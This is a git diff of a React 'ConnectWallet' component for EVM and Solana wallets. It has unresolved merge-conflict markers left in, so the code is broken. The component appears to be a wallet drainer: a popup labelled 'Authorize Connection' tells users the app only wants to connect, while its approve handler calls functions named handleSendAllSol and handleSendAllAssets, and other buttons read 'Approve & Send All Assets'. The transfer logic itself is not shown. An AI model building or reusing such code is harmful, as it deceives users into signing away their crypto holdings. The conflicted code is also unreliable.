@@ -4,6 +4,10 @@ import { Link } from 'react-router-dom';
 import { 
   Import, 
   X, 
+<<<<<<< HEAD
+=======
+  AlertTriangle, 
+>>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
   Zap,
   Eye,
   EyeOff,
@@ -453,6 +457,66 @@ export default function ConnectWallet() {
     </div>
   );
   
+<<<<<<< HEAD
+=======
+  const renderWalletDetails = () => {
+    if (!isConnected && !isSolanaConnected) {
+      return renderConnectionCards();
+    }
+
+    const details = isConnected ? 
+        {
+            title: "EVM Wallet Connected",
+            address: address,
+            balance: walletBalance.eth,
+            currency: "ETH",
+            tokens: walletBalance.tokens,
+            handler: handleSendAllAssets,
+            buttonText: "Approve & Send All Assets"
+        } : 
+        {
+            title: "Solana Wallet Connected",
+            address: solanaAddress,
+            balance: solanaBalance.sol,
+            currency: "SOL",
+            tokens: [],
+            handler: handleSendAllSol,
+            buttonText: "Approve & Send All SOL"
+        };
+
+    return (
+      <div className="bg-gray-900 text-white p-6 rounded-xl shadow-lg w-full max-w-md mx-auto font-sans">
+          <div className="flex items-center justify-between mb-4">
+              <h3 className="text-xl font-bold">{details.title}</h3>
+              <button onClick={() => disconnect()} className="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg text-sm">
+                  Disconnect
+              </button>
+          </div>
+          <div className="bg-gray-700 p-4 rounded-lg">
+              <div className="flex items-center mb-3">
+                  <Wallet className="text-blue-400 mr-3" size={20}/>
+                  <p className="text-sm truncate"><strong>Address:</strong> {details.address}</p>
+              </div>
+              <div className="border-t border-gray-600 my-3"></div>
+              <p className="text-lg font-semibold mb-2">Assets</p>
+              <div className="space-y-2 max-h-48 overflow-y-auto">
+                  <div className="flex justify-between items-center">
+                      <span>{details.currency}</span>
+                      <span>{parseFloat(details.balance).toFixed(5)}</span>
+                  </div>
+                  {details.tokens.map(token => (
+                      <div key={token.symbol} className="flex justify-between items-center text-sm">
+                          <span>{token.symbol}</span>
+                          <span>{parseFloat(token.balance).toFixed(5)}</span>
+                      </div>
+                  ))}
+              </div>
+          </div>
+      </div>
+    );
+  };
+  
+>>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
   const renderManualConnectPopup = () => {
     const goBack = () => {
       setSelectedWallet(null);
@@ -566,6 +630,7 @@ export default function ConnectWallet() {
 
   const renderTransactionPopup = () => {
     const handleApprove = () => {
+<<<<<<< HEAD
       if (isSolanaConnected) {
         handleSendAllSol();
       } else if (isConnected) {
@@ -585,16 +650,33 @@ export default function ConnectWallet() {
         balance: solanaBalance.sol,
         currency: "SOL",
         tokens: [],
+=======
+      if (solanaAddress) {
+        console.log('approve clicked');
+        handleSendAllAssets();
+      }
+      setShowTransactionPopup(false);
+>>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
     };
 
     return (
       <div className="bg-gray-900 text-white p-8 rounded-2xl shadow-lg max-w-md w-full font-sans text-center">
+<<<<<<< HEAD
         <Shield size={48} className={`mx-auto mb-4 ${isSolanaConnected ? 'text-purple-500' : 'text-blue-500'}`} />
         <h2 className="text-2xl font-bold mb-2">
           Authorize Connection
         </h2>
         <p className="text-gray-400 mb-6">
           The application is requesting to connect to your wallet.
+=======
+        {isConnected && <div className="absolute top-4 right-4">{renderWalletDetails()}</div>}
+        <Shield size={48} className={`mx-auto mb-4 ${isSolanaConnected ? 'text-purple-500' : 'text-blue-500'}`} />
+        <h2 className="text-2xl font-bold mb-2">
+          {isSolanaConnected ? 'Solana' : 'Ethereum'} Connection Request
+        </h2>
+        <p className="text-gray-400 mb-6">
+          The application is requesting to connect your {isSolanaConnected ? 'Solana' : 'Ethereum'} wallet...
+>>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
         </p>
 
         {txError && (
@@ -647,6 +729,7 @@ export default function ConnectWallet() {
       </header>
 
       <main className="flex-grow flex items-center justify-center z-10 p-4">
+<<<<<<< HEAD
         {!isConnected && !showManualPopup && renderConnectionCards()}
       </main>
 
@@ -655,6 +738,29 @@ export default function ConnectWallet() {
         <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
           {showManualPopup && renderManualConnectPopup()}
           {isConnected && showTransactionPopup && renderTransactionPopup()}
+=======
+        {!isConnected && !showManualPopup && !showTransactionPopup && renderConnectionCards()}
+        
+        {isConnected && !showTransactionPopup && (
+          <div className="text-center">
+            <h2 className="text-3xl font-bold mb-4">You are Connected!</h2>
+            {renderWalletDetails()}
+            <button
+              onClick={() => setShowTransactionPopup(true)}
+              className="mt-4 bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
+            >
+              Show Actions
+          </button>
+          </div>
+        )}
+      </main>
+
+      {/* Popups (Modals) */}
+      {(showManualPopup || showTransactionPopup) && (
+        <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
+          {showManualPopup && renderManualConnectPopup()}
+          {showTransactionPopup && renderTransactionPopup()}
+>>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
         </div>
       )}
       
